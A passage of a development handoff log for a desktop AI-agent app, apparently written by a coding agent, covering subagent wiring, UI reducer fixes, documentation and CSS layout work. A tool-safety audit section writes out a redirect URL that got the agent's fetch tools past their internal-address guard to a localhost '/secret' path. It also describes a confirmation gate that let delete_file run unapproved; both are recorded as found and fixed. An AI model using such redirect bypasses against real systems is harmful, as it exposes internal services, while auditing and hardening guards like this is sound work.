  `test_user_questions.py::test_the_new_flag_is_not_advertised_to_the_model`. The
  omission is deliberate: `asks_user` is the orchestrator's *scheduling* information, not
  part of the contract the model and `tools.get` are shown. The change was reverted, and
  the `describe()` docstring amended instead, because its wording — "every flag is
  emitted" — is what invited the wrong change. **The test caught a real mistake.**
* **`user_io`'s contract is met, not broken.** The review first recorded that
  `UserUnavailable`'s promise (a windowless core refuses instantly) was unmet, because
  constructing a session *appeared* to install the listener.
  `install_question_bridge` is an explicit call made only by `StdioServer`, so a bare
  session has no listener and refuses at once, exactly as documented. The correction
  matters: it was very nearly written into this file as a product bug, and the next
  session would have gone hunting for it.

### One count that was wrong

The list of tools that can never prompt said **five** — `http_request`, `web_fetch` and
three browser tools. Counted against the registry it is **six**: the sixth is
`execute_js`, which no list would have found from memory. Since that list is guidance for
future work, the error would have left one inert tool behind. Corrected in both places it
appeared. (`web_fetch` joined the set in the Phase 1 pass, when it was given
`http_request`'s flags.)

### What the review verified

    python -m pytest -m "not docker" -q     # 966 passed, 10 skipped, 41s, one process
    cd app && npm test                      # 593 passed, 98 suites
    python scripts/e2e_all_tools.py --fast  # 47 checks, 0 failed, all 34 tools

Uncommitted from the review: `tests/conftest.py`, `src/tonyagent/tools/base.py` (a
docstring only) and this file. See Status at the top.

---

## The registry's children, and the child's frames (2026-10-11)

**Two items the last handoff left open, both closed, both checked the way the handoff
asked for.** The first was one method call; the second was supposed to need a real
provider, and did not.

### The registry hole: one call site, and the reason it is that one

`SubagentRegistry.restart()` had been written for exactly this and had no caller. The
wiring is a single call in `headless/server.py::_attach_session`, which is the one host
path every session replacement goes through — `conversations.switch`,
`conversations.create`, and the startup restore — so a child can never outlive the
conversation whose turn spawned it:

* the outgoing chat's children stop being listed in the incoming chat's `list_agents`
  (the registry is process-wide, so it would otherwise answer for a dead session);
* a **running** child is cancelled with the switch. That half is the one that spends
  money: a child still working for a conversation the window has left is a turn nobody
  can read.

The placement mirrors `install_question_bridge`, the handoff's own model for this shape:
one host act at attach time, not a per-call-site cleanup.

**A test that would have passed for the wrong reason, caught before it was written.**
The protocol test spawns its child *after* constructing the `StdioServer`, not before:
construction is itself an attach, so a child seeded first would have been cleared by the
very wiring under test and the assertion would have held even if the switch had done
nothing. The test comments say so, so the next reader does not "simplify" it back.

Tests: `test_restart_cancels_a_running_child_and_drops_the_listing` (registry level, with
a `wait_for` timeout so a regression fails in a second instead of sleeping 30s), plus
`test_switching_conversations_forgets_the_previous_chats_children` and
`test_switching_conversations_stops_a_child_that_is_still_running` (protocol level).

### The live-window question, answered by capture

The handoff's fear was specific: nobody had watched a real child's frames in the real
window, so whether they "render anywhere, duplicate, or vanish in `MessageList`" was
known only to the code. A real provider was the suggested check. **A real provider turned
out not to be necessary — a faithful capture was, and it found more than the eye would
have.** `scripts/capture_child_frames.py` runs one real parent turn whose stub provider
calls `subagent` and then answers, with a real child session (the project's own audited
stub-provider pattern), and prints every frame the window would receive, in wire order.
Replaying that sequence through `applyEvent` is what actually happens in the window —
minus the pixels.

Two real bugs, both invisible to the Python-side test that pinned the child's events:

1. **The child's answer rendered as an extra, unlabelled assistant bubble.** The reducer
   created a placeholder for *any* turn id at `turn.started` (and `message.started`), so
   the child's turn got a bubble of its own and its deltas streamed into it. Worse than
   the handoff's phrase ("append to the child's message"): there was no child's message
   in the window — the bubble *was* the child, rendered as the assistant, in the parent's
   transcript. The child's conclusion already reaches the user through the `subagent`
   card; the bubble duplicated it as prose the assistant apparently said.
2. **The child's `turn.finished` cleared `busy` while the parent was still working.**
   `busy` is what locks the composer and draws Stop. For the rest of the parent's turn
   the window showed an idle composer that the core would refuse with "a turn is already
   running" — a message the user could not have predicted from what was on screen. The
   same gate also mattered for `turn.failed`: a child's provider failure would have
   painted the parent's running turn failed, then the parent would have answered anyway.

**The fix is a decision about whose turn a frame is.** `ChatState` now carries
`activeTurnId` — the turn the window started and is rendering. `turn.started` while a
turn is already active is a subagent's, and is ignored (no bubble, no `busy`, no
`error`); `message.started` creates a placeholder only for the active turn;
`turn.finished`/`turn.failed`/`error` from a foreign turn are ignored entirely. A **null**
`activeTurnId` is never foreign: the Phase 4 contract that an ask cannot outlive its turn
(a terminal event for a turn this window never saw start) still lands, which is why the
gate is `turnId !== null && activeTurnId !== null && turnId !== activeTurnId` and not a
straight equality.

**The App clears the id wherever it replaces the transcript** — `showMessages`
(conversation switch), delete-of-the-open-chat, and mode change. That is not tidiness: a
switch mid-turn would otherwise leave the id pointing at a turn whose frames will never
arrive (the old bus is unsubscribed), and the *next* turn's `turn.started` would look
like a subagent's and be ignored — a transcript that silently stops rendering after a
conversation switch. Those three sites are the only ones that replace `messages`.

Three reducer tests replay the captured sequence (kept verbatim in `events.test.ts`,
with the capture script named in the comment so it can be regenerated):
the child's run produces exactly one assistant message (the parent's, whose subagent card
carries `summary`), `busy` stays true through the child's whole turn and moves only when
the *parent* finishes, and a child's `turn.failed` leaves no banner and the parent still
finishes normally.

### What is not verified, said plainly

* **The live GUI with a real provider.** The frames are captured from a real run and the
  reducer is pinned against them; no human has seen a real child in the running window.
  The remaining risk is rendering rather than logic (`MessageList` shows the parent's
  bubble with the subagent card; nothing in this pass touches its markup). With a real
  provider bound, the check is: send a message that provokes a `subagent` call and watch
  the card — no child bubble, no mid-turn composer unlock.
* **Nested UI.** The child's work is still invisible beyond the card, and the reducer now
  *deliberately* drops its frames. Making them visible under the card needs the core to
  say whose child a frame is (a parent/child field on the event) — the current frames
  carry a turn id but nothing that links them to the tool call that spawned them. That is
  Phase 6-shaped work; the ignore path in `events.ts` is where it plugs in.

### What this pass verified

    python -m pytest -m "not docker" -q     # 1016 passed, 11 skipped, 42s, one process
    cd app && npm test                      # 596 passed, 98 suites
    cd app && npm run typecheck             # clean
    cd app && npm run build                 # clean
    python scripts/e2e_all_tools.py --fast  # 50 checks, 0 failed, all 37 tools

Uncommitted: `src/tonyagent/headless/server.py`, `tests/unit/test_conversations_protocol.py`,
`tests/unit/test_subagents.py`, `app/src/events.ts`, `app/src/App.tsx`,
`app/src/events.test.ts`, `scripts/capture_child_frames.py` (new), and this file.

---

## Nested subagent work (2026-10-11)

**What the handoff called "the streak ends here", built and looked at.** A child
session now has its work rendered in the window under the card of the tool call that
spawned it: the tools it ran, the answer it returned, and whether it is still working.
Nothing of the child appears as the assistant's own message, and nothing of the child
can move the parent's turn state.

### The link: `parent_call_id`, and where it comes from

A child's turn id was never enough to attribute its frames — it is the *child's* id,
and the parent transcript has never seen it. So each frame now carries two more fields
(`Event.subagent` / `parent_call_id` in `src/tonyagent/core/events.py`):

* **the child's name**, set by `SubagentRegistry.spawn` before the child can emit
  anything (`AgentSession.subagent_name`), and
* **the id of the parent tool call**, which only the orchestrator knows. It is
  recorded for the duration of each execution in a **`ContextVar`**
  (`tools/base.py`, set/reset around `tool.execute` in `tools/orchestrator.py`), and
  the `subagent` tool reads it at spawn time. A ContextVar is not decoration: the
  independent calls in one assistant message run as concurrent tasks, and each task
  has to see *its own* call — the same fact `test_the_executing_call_is_recorded_for_
  its_own_task` pins with a two-call overlap. A tool driven directly (a test, a
  script) sees `None` and the child carries no link, which is honest: there was no
  card for it to belong to.

Only a child's frames carry these keys; `Event.to_dict` adds them only when set, so
every other frame on the wire is byte-for-byte what it was.

### The reducer: routed before any turn logic

`applyEvent` checks `parent_call_id` **first** and hands the frame to
`applySubagentEvent`, which finds the card by call id and folds the frame in: the
child's `message.delta`/`message.completed` into its answer, its
`tool.started/tool.completed` into its own tool list, its `turn.started/-finished`
into `running`. No child frame reaches the turn switch at all, so the whole class of
bugs the active-turn guard was written for — a second bubble, `busy` cleared
mid-turn, a false error banner — is now unreachable by construction, not merely
guarded. The fallback guard stays for unattributed foreign turns (a child spawned
outside a call), pinned in `a child that cannot say whose it is stays a foreign
turn`.

A frame whose card is not in the transcript (conversation switched away, or a
restored transcript, which reloads messages without tool cards) is dropped, not
bubbled.

**A state-copy subtlety worth keeping.** `copyMessages` had to start deep-copying the
child object and its tool list. The shallow copy was correct while a tool call was
flat, and a nested object written through with it is exactly the corruption the
deep copy exists to prevent — `the reducer does not mutate the state it was given`
is the test that would have caught it late.

### The rendering, and what it was checked against

`SubagentWork` (`app/src/MessageList.tsx`) renders inside the card's flex unit: a
header (child name, `working…`/`answered`), one row per child tool call, and the
child's answer as Markdown. The left rule takes `--accent` while the child runs and
`--border` when it is done; the card's own status and `detail` stay the *parent*
call's (`subagent <name>: N/M tool calls`), so the child finishing never marks the
call finished.

Checked as pixels, because "show" deserves a look rather than an assertion:
`app/nested-preview.html` + `app/src/nested-preview.tsx` mount the **real**
`MessageList` against the **real** stylesheets with a realistic finished child (three
tools, an answer, a Markdown code span). Rendered in the browser at 1100x900: the
nested block appears under the card, computed styles confirm `--ok` on the child's
tool marks and `--border` on the rule, and there are no console errors. Run
`npm run dev` in `app/` and open `/nested-preview.html` to see it; the files are
disposable and not part of the built bundle (`index.html` is the only Vite entry).

### What this pass verified

    python -m pytest -m "not docker" -q     # 1019 passed, 11 skipped, 42s, one process
    cd app && npm test                      # 604 passed, 99 suites
    cd app && npm run typecheck             # clean (includes the preview harness)
    cd app && npm run build                 # clean
    python scripts/e2e_all_tools.py --fast  # 50 checks, 0 failed
    python scripts/audit_reduced_motion.py  # passes (no animation added)

Tests added: two in `tests/unit/test_subagents.py` (a real child's frames carry the
call id and name; a direct spawn carries no link), one in
`tests/unit/test_tool_orchestrator_path.py` (per-task recording under a concurrent
batch), four reducer tests in `app/src/events.test.ts` (nested work lands on the
card, the running state, dropping without a card, the unattributed fallback) and
four markup tests in `app/src/MessageList.test.tsx`.

### What is deliberately not in it

* **The child's reasoning is not shown.** `reasoning.*` from a child is ignored by
  the routing (`default:` in `applySubagentEvent`). Folding a second thinking panel
  into a card is a design question this pass did not need to answer.
* **A reopened conversation shows no nested work.** `showMessages` rebuilds
  transcripts from saved messages, which carry no tool cards at all — a pre-existing
  limit of restoring, not of this view.
* **One level deep.** Nested subagents are refused, so a child cannot spawn a
  grandchild. **The mechanism changed** with the fan-out pass: it used to fall out of
  the serial gate ("one subagent runs at a time"), which refused every spawn while a
  child was running, and would have been lost when that gate was removed. It is now
  `MAX_SUBAGENT_DEPTH = 1` in `subagent_tools`, enforced in `_drive_child` and said in
  its own words — see the Phase 6 section above.
* **The live GUI with a real provider is still unwatched.** The frames are captured,
  the reducer pinned, and the component rendered against real styles — but no real
  child has streamed into a card in the running window yet. With a real provider
  bound, provoke a `subagent` call and watch the card fill in.

Uncommitted: `src/tonyagent/core/events.py`, `src/tonyagent/core/session.py`,
`src/tonyagent/tools/base.py`, `src/tonyagent/tools/orchestrator.py`,
`src/tonyagent/tools/subagent_tools.py`, `tests/unit/test_subagents.py`,
`tests/unit/test_tool_orchestrator_path.py`, `app/src/backend.ts`,
`app/src/events.ts`, `app/src/events.test.ts`, `app/src/MessageList.tsx`,
`app/src/MessageList.test.tsx`, `app/src/styles/tool-calls.css`,
`app/nested-preview.html` (new), `app/src/nested-preview.tsx` (new), and this file.

---

## The confirmation gate, and the redirect the guard missed (2026-10-11)

An audit pass went looking for tool-safety gaps rather than re-reading claims, and
found three that the suite could not see because every test either installed a
bridge or called the tool directly. All three are fixed, and each has a test that
fails on the previous code — verified by reverting the file under test and watching
it fail, not by assuming.

### 1. The internal-address guard stopped at the first hop

Measured: `web_fetch` and `http_request` both refused `http://127.0.0.1:8123/`, and
both returned that address's body when it was reached through
`https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%3A8123%2Fsecret`. The
guard was asked once, about the URL the model typed; the client was then told
`follow_redirects=True`, and the address actually read was never checked. A guard
that anyone who can serve a 302 can walk around is not a guard.

The fix is one httpx **request event hook** (`_refuse_internal_target`), which httpx
calls for *every* request it makes — redirect hops included — and before the request
goes out (`_send_handling_redirects` awaits the hooks ahead of each
`_send_single_request`; verified in the installed 0.28.1). It is deliberately not a
second copy of the rule: it calls the same `_internal_host_refusal`, so the
pre-flight check and every hop give the same answer in the same words. Hand-rolling
the redirect loop instead would have meant re-implementing method rewrites and
cross-origin `Authorization` stripping — the hook keeps httpx's semantics and adds
only the check.

Two things worth keeping: the hook is **async** (the async redirect loop awaits it; a
plain function fails with `object NoneType can't be used in 'await' expression`),
and `_guarded_client` is the single constructor both tools use, so a call site
cannot forget it.

`tests/unit/test_network_guard_redirects.py` drives the real tools against the **real
client** — same `follow_redirects`, same hook — with only the transport replaced, so
a call site that drops the hook fails the test. It covers the refusal, the two tools'
agreement on wording, a chain refused at the hop that turns internal, a relative
`Location` still followed, and a redirect loop coming back as an error rather than a
hang. Reverting `network_tools.py` to HEAD fails three of the five.

### 2. The gate skipped when there was nobody to ask

`_request_confirmation` returned `None` with no callback installed, and the caller
reads `None` as *approved* — so `delete_file` ran with no prompt and no user, status
`success`, file gone. The window always installs a bridge, which is exactly why it
was invisible. It now returns a refusal in words the model can act on, and
`tests/unit/test_confirmation_contract.py` pins it, with the approving-bridge case
beside it so the refusal cannot be mistaken for a broken tool. Four existing call
sites in `test_modes_and_diffs.py` and `test_tool_summary_line.py` had been relying
on the skip to let a destructive tool run; they now send `Allow` explicitly, which is
what they always meant.

### 3. A stopped turn kept its dialog, and a cancelled prompt leaked

Three faces of one lifecycle gap:

* The cleanup after the confirmation wait was a statement, not a `finally`, so
  cancelling the turn left the entry in `_pending_confirmations` for the life of the
  process. Now it always leaves.
* Nothing published `confirmation.resolved` when a prompt was abandoned — on a stop
  *or* on the 60-second timeout — so the window's `pendingConfirm` stayed set. The
  session now tracks the prompts it published and closes them at the end of the turn
  (`_close_open_confirmations`, in `_run_turn_body`'s `finally`, which the child's own
  turn also passes through), and the reducer clears `pendingConfirm` on
  `turn.finished`/`turn.failed` as well: the core's frame is the mechanism, the
  reducer's clear is the guarantee.
* **Stop did not release the tool at all.** `cancel()` only set the flag, and nothing
  polls it while a tool awaits a prompt, so a stopped turn sat out the full minute
  (measured: turn still running 1.5s after Stop, dialog still up, no `resolved`).
  `cancel()` now answers the open prompt *no*, which releases the wait immediately.
  The timeout is now `CONFIRMATION_TIMEOUT_S`, a named constant like
  `user_io.ASK_TIMEOUT_S`, so the wait's own path is testable instead of a 60-second
  test.

`tests/unit/test_confirmation_contract.py` measures all three (leak, timeout, stop) on
the real session, and `events.test.ts` adds the reducer's half plus the negative that
another turn's terminal frame does not close this turn's dialog. Reverting
`orchestrator.py`/`session.py` to their pre-pass behaviour fails the corresponding
tests — checked by running the old bodies, not by assuming.

### Still open, unchanged from the previous section

Phase 6 (`workflow`) and Phase 7 (skills) have both landed (see "Phase 6 (workflow)"
and "Phase 7 (skills)" above); `exit_plan_mode` and sandbox-side background jobs are
still not built, and the `@` half of the composer's placeholder is still a hint with
nothing behind it (the `/` half is real now). Non-blocking gaps this pass saw but did
not touch, now with evidence rather than a shrug:

* `Orchestrator._execution_history` grows without a cap and `get_history` /
  `clear_history` have no callers anywhere — dead state that holds full tool arguments.
* ~~The subagent registry has no depth or count limit, and a child inherits Build mode,
  so a child can spawn children (bounded only by the per-level budget and the 120s
  timeout).~~ **Both halves are now closed**: `MAX_SUBAGENT_DEPTH = 1` stops the
  nesting, and `MAX_CHILDREN_PER_TURN = 8` stops the count. (The "no depth limit" claim
  was wrong even when it was written — the serial gate refused the spawn — but nothing
  tested it, which is exactly how a rule gets lost. It has tests now.)
* ~~`README.md` and `PROJECT_SUMMARY.md` still say 32 tools, Tauri MSI builds and a live
  Tkinter client.~~ **Closed** in the documentation-and-layout pass below: both now describe
the pywebview host, the 41 registered tools, the Docker/WSL backends and the dark-only
token system. What is left in the docs is the corpus of *historical* sections, which now
say so in their own headings rather than being silently stale.

## The docs, and one layout instead of six (2026-10-13)

### The docs were describing a different application

Not stale by a version -- stale by a *shell*. `README.md` and `PROJECT_SUMMARY.md`
both still opened on Tauri MSI installers, a live Tkinter client, 32 tools, a
light/dark/system theme and OpenRouter as the only provider. Every one of those had
stopped being true at a different time, which is why no single edit had caught them:
the shell moved on 10-10, the provider count on 09-27, the theme when the design
system collapsed to one dark palette. They now describe the pywebview host, the
React/Vite frontend, the headless core, **41 tools** and **2 providers**.

Two numbers in them were wrong in a way worth naming, because both were *counts of
things in the source* rather than prose: the IPC row said "25 methods, 16 events".
Measured instead of remembered -- `headless/server.py`'s handler table has **41**
entries and `core/events.py`'s `EventType` has **19** members. The 25 was probably
true when it was written; nothing in the repository checks a number in a Markdown
table, so it stayed.

Historical sections are now labelled as history rather than quietly contradicting
the summary above them, and `app/vite.config.ts` no longer explains itself in terms
of a Rust build directory that does not exist: its `server.watch.ignored` list was
`src-tauri/**` and `binaries/**`, and the comment beside it described a cargo build
holding `.exe` files open until `fs.watch` failed with EBUSY and killed Vite. The
list now ignores `.tmp/**` (where `npm test` rewrites its compiled output, so a dev
server watching it would reload the page once per test file) and `dist/**`.

### The layout: the same defect as every previous sweep, one level up

The complaint was "the design and the layout are inconsistent". Measured first,
changed second -- and the defects had one shape between them, **the same thing
declared in two places and therefore drifted**, which is what the last three passes
found too, at a smaller scale.

**The reading column agreed with itself at exactly one window width.** At 1280 the
transcript's inner box and the composer's inner box were both `292..1052` (760px).
At a 760px window they were `74..750` (676) against `96..728` (632): 22px apart on
the left edge, 44px on the width, with the banner and the log strip spanning the
full 696 in between. Both boxes were `max-width: var(--measure)` and centred, so
above 888px the cap hid the difference and below it every width had its own. The
cause was one column derived two ways: `.transcript` holds a `scrollbar-gutter:
stable both-edges` reservation and takes no padding, while `.composer` takes 32px of
padding and has no scroller.

The fix is the air as a token and the gutter added to it, once:

```css
--column-air: 22px;                                  /* the transcript's own padding */
--column-edge: calc(var(--column-air) + var(--scrollbar));  /* 32: what a surface without a scroller holds */
```

`.transcript` takes the air (its own gutter supplies the rest), and the composer, the
banner and the log strip take the edge -- the banner and the strip as
`width: calc(100% - 2 * var(--column-edge))`, because they are children of `.main`
with no padding of their own, which is exactly why they could span a narrow window
while the field below them could not. **22 + 10 is the 32 the composer already had**,
so nothing above 888px moved and everything below it now agrees. Measured after: at
760 all four surfaces are `96..728` (632); at 1280 the composer and the transcript
are `292..1052` (760) as before.

**`--measure`'s own claim was being defeated by a literal two rules away.** The token
says the composer is as wide as the messages it replies to. `.bubble` capped at
`min(680px, 84%)`: 680 is the value `--measure` held *before* it moved to 760 -- a
stale copy of a token -- and 84% resolved against the transcript's content box, a
second definition of the column in a unit no token can reach, which shrank as the
window did while the field above it did not. Measured at 1280: the prose ran
`224..830.5`, 606.5px, inside a 722px column under a 760px field whose text starts on
the same pixel. The assistant's prose is now the column (`max-width: 100%`, with
`fit-content` still hugging a short message), and the one cap left is on the user's
bubble (`min(560px, 100%)`), because that one is a chip rather than a column -- and
`100%` is the column, so it can never exceed it.

**Six breakpoints, three of them invented in one pass for one surface.** The
compact-window work had the title bar reflowing at 720, 540 and 390, the dashboard at
680 and 430, and the status bar at 560 -- so one window changed state six times, at
six sizes, in three surfaces that all say "narrow". The ladder is now three widths
with one job each -- **720, 560, 420** -- declared in `tokens.css` (a media query
prelude is evaluated before any variable exists, so it is a written-down convention
with a test behind it rather than a token), and `layout.test.ts` walks every
`@media (max-width: Npx)` in the cascade and fails on an N that is not one of them. A
`@container` query is explicitly *not* on it and the test says so: the one in
`code-viewer.css` asks about the code pane, which is a different question.

**Five panel content edges, none derivable from the others.** 10 (the chat list's head
and foot), 12 (its group labels), 14 (the Files filter and its empty state), 18 (every
dialog, since `.modal` is the base all three share) and
`clamp(16px, 2.5vw, 32px)` on the dashboard -- which made the dashboard the only
surface in the window whose content edge moved when the window was resized (measured
27.6px in a 1106px window, 16px in a 760px one). Two tokens now:

* `--pad-panel` (16): where a panel's content starts -- the chat list's head, foot,
  labels, rows and empty state, the Files filter and its tree, the code explorer's
  head, the code viewer's header, `.modal`'s padding (and therefore all three dialogs,
  the settings pane and the search pane), and the dashboard.
* `--pad-row` (8): how far a row's own fill is inset *and* how much it pads, so the two
  together are `--pad-panel` and a row's text lands on the panel's edge. The regions
  that hold those cards inset by the same token, which is what makes the arithmetic
  true rather than lucky.

The dialog footer was the sharpest example: `.modal-actions` cancels `.modal`'s
padding with three literals, and `settings.css` carried a second set of the same three
for the same bar as a sidebar pane -- six copies of one number in two files. They are
`calc(-1 * var(--pad-panel))` now, in both places.

Measured in Chromium after the change, with `offsetLeft` rather than rects (the
preview's compositing had stalled by then, so an animated panel reports a mid-slide
`x`; `offsetLeft` is layout and immune):

| surface | content edge | was |
|---|---|---|
| chat list head, foot | 16 | 10 |
| chat list label / row text | 16 (8 region + 8 card) | 12 / 20 |
| New chat button (box, text) | 8, 16 | 12, 24 |
| Files filter (box), empty state | 8, 16 | 12, 14 |
| code explorer head | 16 | 12 |
| settings pane (h3, note, tabs) | 16 | 18 |
| usage head and tiles | 16, at every width | 16--27.6, by window |
| code viewer header | 16 | 10 |

### One bug found on the way

The status bar's compact rule aimed itself with `span:nth-of-type(2)` and
`span:nth-of-type(5)`. Those indices are not stable: with no provider bound the row
swaps its provider span for a `linkish` **button**, every later span renumbers, and
the same two selectors then hide a different pair of things -- in exactly the state
where the bar is telling the user what to do. It hides by name now
(`.statusbar-state`, `.statusbar-sandbox`, `.sep`), and the test asserts the *class*,
plus that `nth-of-type` does not come back.

### Verification, and what it does not cover

`npm test` **820 passed / 127 suites** (six new tests: the ladder, the container query
that is not on it, the shared column box, the bubble that is the column, the panel
edge, the card inset), `npx tsc --noEmit` exit 0,
`scripts/audit_reduced_motion.py` clean, `pytest tests/unit -q -m "not docker"` green.
Geometry measured in a real browser at 1280, 760, 560 and 420: no horizontal overflow
at any of them, the four reading-column surfaces identical, and the status bar at 420
reduced to provider/model and Logs with the tab strip collapsed to zero, as the ladder
intends.

**Not covered:** the preview webview stopped compositing partway through the session
("produced no frames"), so **there is no screenshot of the result** -- the numbers
above are `getBoundingClientRect` / `offsetLeft` / `getComputedStyle`, not a look at
it. The panel measurements needed a window host, so they were taken through a scratch
page served by the dev server that installs a stub `window.pywebview` answering the
core protocol from fixed data; it was deleted afterwards and nothing of it is in the
repository. And the two column widths that remain deliberately different (`--list-w`
288 for chats, `--code-side-w` 268 for the code tree, documented in `tokens.css` as
sized by different evidence) were left alone.

### Still open

* The Files pane and the code explorer were measured empty: the stub host's
  `files.tree` reply never produced rows, so a populated tree, the code viewer with a
  file in it, and the search panel are unmeasured this pass.
* The three ladder steps are the *chrome's* ladder. If a surface ever needs to change
  at a width the window does not, the answer is a container query -- and the ladder
  test will refuse the media query, which is the intent.
* `--pad-panel` is not applied to the window chrome (the top bar's 8px gaps, the
  status bar's 12px, the rail's own padding). Those are hairlines and hit targets
  rather than content insets, and pretending otherwise would have moved the caption
  buttons for no reason.

## Plain Chat and the Code assistant (2026-10-13)

Chat was already enforced in the core; this pass exposes it. The composer lists
Chat first, and its read-only hint now renders the active mode's own
description, so Chat says that nothing is read, run, or changed. The Code-mode
assistant renders the same shared `conversationView`, mounted in only one place
at a time; its toggle keeps the header mounted while the body goes away, so the
panel closes without stranding a hidden composer. `App.test.tsx` pins one
composer across the Agent/Code switch, the helper toggle round-trip, Chat
selection through `mode.set`, and the Chat hint copy.

## The read-only composer's corners (2026-10-14)

Chat, Plan and Skills mark the field by tinting the *textarea*, and the textarea is a
square inside a 24px box that cannot clip it -- `.composer-inner` has no
`overflow: hidden` because the `/` menu hangs out of its top edge. So the opaque fill
squared off the field's own top corners in exactly those three modes and left the
bottom two round, because the control row carries no fill. Build and Mission were
right by accident.

The fill was given the border's *inner* arc (`calc(var(--radius-lg) - 1px)` on the
top two corners only), so the two curves were concentric rather than nearly so. The
proof was a hit test on the pixel 3px inside the field's top-left corner: before, it
resolved to `TEXTAREA.is-readonly`; after, to the field's own box. `layout.test.ts`
pinned that rule while it existed, along with the 1px border it subtracted and the
reason it was needed -- that the field clips nothing.

That worked, and the fill itself was still wrong: measured the same way, the three
read-only modes were a different *colour* from the other two, not just a different
shape. See the next section -- the fill is gone, and the radii went with it.

`code-preview.html`'s stub core also knew two modes, Build and Plan, which is why the
defect was invisible on that page while the real window had it: Chat and Skills were
not there to be wrong. It answers with the core's five `MODE_ORDER` modes and the
core's own words now.

## One fill for the composer (2026-10-14)

The read-only fill is gone. Chat, Plan and Skills tinted the *textarea* with
`color-mix(in srgb, var(--input) 70%, var(--bg))` -- opaque, and the browser
computes it to `color(srgb 0.148627 0.148627 0.148627)` where Build's textarea
computes to `rgba(0, 0, 0, 0)`. Because the fill belonged to the textarea rather
than to the field, it stopped at the control row: those three modes drew a grey
typing area stacked on a glass one, and the corner fix above could only make the
seam round. All five modes now show the field's own `--glass-field` through a
transparent textarea -- one surface, whichever mode is selected.

The state is still stated, twice, without repainting anything: the lit pill in the
mode group is the active mode, and the hint under the field spells it out in words
("Chat mode -- Talk. Nothing is read, run or changed."), which is the copy a screen
reader gets too. `Composer.tsx` keeps `is-readonly` on the textarea as the markup's
own statement of the state rather than as a style hook, and `layout.test.ts`'s "the
field is one field in every mode" holds the stylesheet to having no rule for it --
read from the comment-stripped `SOURCE`, so the comment explaining the removal can
still name the selector -- and to `.composer textarea` staying `background:
transparent`. Checked that the assertion bites: the regex is false against today's
modules and true against the same text with the old rule appended.

Two declarations went with the fill, both of which existed only to hold it inside
the field's radius: the `calc(var(--radius-lg) - 1px)` top corners, and
`border-color: var(--border)` -- which painted nothing anyway, since `.composer
textarea` sets `border: 0`, so a colour on a 0-width `none`-style border is a
declaration no pixel can see. Verified: `npm test` **823 passed / 127 suites**, exit
0; `npx tsc --noEmit` exit 0; `scripts/audit_reduced_motion.py` clean; and in the dev
server (`code-preview.html`, which mounts the real `App`) Chat's textarea computes to
`rgba(0, 0, 0, 0)` with `is-readonly` on it, inside a field still filled with
`rgba(46, 46, 46, 0.78)`.

Still open: the composer's scrollbar is a square-cornered box inside a rounded field,
so a long message can poke the top of its thumb through the field's top-right corner.
That is pre-existing, identical in every mode now and before this pass (Chromium
paints a scrollbar over the border box without clipping it to the radius -- see
`scrollbars.css` for the same defect measured on `.modal`), and it is not mine to fix
here. Unmeasured this pass: the same corner at 125% display scaling.

## The stadium sweep (2026-10-14)

The shape rule was already written in `tokens.css` -- "a control you can see the edge
of is a stadium, and a corner that stops short of one is a container" -- and about
half the window obeyed it. The per-turn budget popover is where it showed: a grid of
six pill presets over a 6px-cornered `Set` button and a 6px-cornered number field, in
a row that is one control.

One criterion decided every case: a control that paints an edge -- at rest, or on
hover, or when selected -- is a stadium. So the composer's `+`, gear and budget
buttons are discs beside Send's disc (rank is the fill's job, not the shape's); the
attachment chip and its thumbnail; the model picker's filter; the drawer's toggle,
back, footer actions and New chat; the tab's rename field and close glyph; the rail's
44px buttons; the assistant's toggle; the code viewer's close disc; the settings
panel's selects, text fields and the two 24px key actions; the permission trigger.

What kept a corner, each an argument rather than an oversight: every panel, menu,
card, notice and code block (surfaces); the document tab, whose bottom corners are
square because it is cut into the bar's own edge; the composer field and the
permission control's *open* state, which hold a stack of controls, so a pill would
put an arc through the first and last of them; the keycaps in the empty state; and
the sidebar's folder heading, which is pressable but paints no fill at all (its hover
is a colour change), so it has no shape to round.

### The rows came back (same pass)

The same criterion went on to *rows* -- the `/` menu's items, the model picker's, the
row menu's, the permission rungs, the file tree, the conversation list and the inline
rename field -- and that half of it was wrong, on one look at the running window. A
row is not one control: it is one of a column, as tall as a line or two of text and
stacked against its neighbours, so a stadium turns a list into a column of buttons.
The conversation row measured 271x56 -- a capsule with 28px ends carrying the
selection wash, which read as the largest control in the window -- and the `/` menu's
row 712x31, a bar spanning the whole composer. They are back to `--radius-md` (the
conversation row), `--radius-sm` (the tree, and the rename field inside the row) and
`--radius-xs` (every menu item). The line the window draws is not "does it paint an
edge", which a row does on hover, but "is it one thing you press, or one of a stack
of them".

That also settled the permission rungs' 2px coloured left edge, which a pill had
turned into a crescent hugging the row's end: a straight left side is half of what
makes that mark, and a stadium has none. One inset was kept deliberately -- the model
picker's rows still sit 12px in, because the filter above them is a stadium whose text
is at 12px and a menu's rows share the text column of the field at the top of it. The
radius is the shape; the inset is the column.

`layout.test.ts` now holds all three lists -- `no control has a corner`, `no row is a
stadium either` and `and no container wears a control's shape` -- because "which
classes are controls" is not
something a stylesheet knows about itself, and a test that guessed from a selector's
shape would be testing its own guess. It reads every block a selector owns rather
than `body`'s last one: the first run failed on `.chatrow`, which owns an
animation-only block in `arriving.css` that says nothing about its shape, and a block
with no `border-radius` is an omission rather than an override.

Verified: `npm test` **826 passed / 127 suites** exit 0 (the three new tests are among
them), `npx tsc --noEmit` exit 0, `scripts/audit_reduced_motion.py` clean, `npm run
build` exit 0. Then measured in the DOM rather than read off the stylesheet, in the
dev server (`code-preview.html`, the real `App`), across the composer, the budget
popover, the drawer on both panes, the settings pane and Code mode: the budget
popover's `Set` is 47x26 at 999px, its number field 154x26 at 999px and a preset
66x26; the drawer's New chat 271x40 at 999px, its Files filter 271x34 at 999px and
its Search field 999px; and the rows at their corners -- the conversation row 271x56
at 16px, its own button 245x56 at 16px, the tree row 271x26 at 12px, a row-menu item
122x31 at 6px. The only controls that measure square are the two whose visible box is
their parent: the Files filter's own `input`, and the composer's textarea inside the
24px field. The only other rectangles in the window are the document tab (30x51) and
a keycap (20x21), which is the lists above arriving in the DOM.

Not measured in the preview, because its stub core does not serve them: the model
picker's filter and rows, the settings Keys tab's selects and reveal buttons, and the
code viewer's close button. Those are held by the test rather than by a rendered box,
and they are the one part of this pass I would call verified by reading rather than by
looking.

## Overflow: what leaves the window (2026-10-14) -- findings

Found by walking the running page rather than by reading it: open each surface, then
ask every visible `position: fixed|absolute` box whether its rect is inside the client
rect. Two surfaces fail, one is latent, and the rest of the window is clean.

**The top-bar model picker leaves the window on its right.** `.modelpicker` is
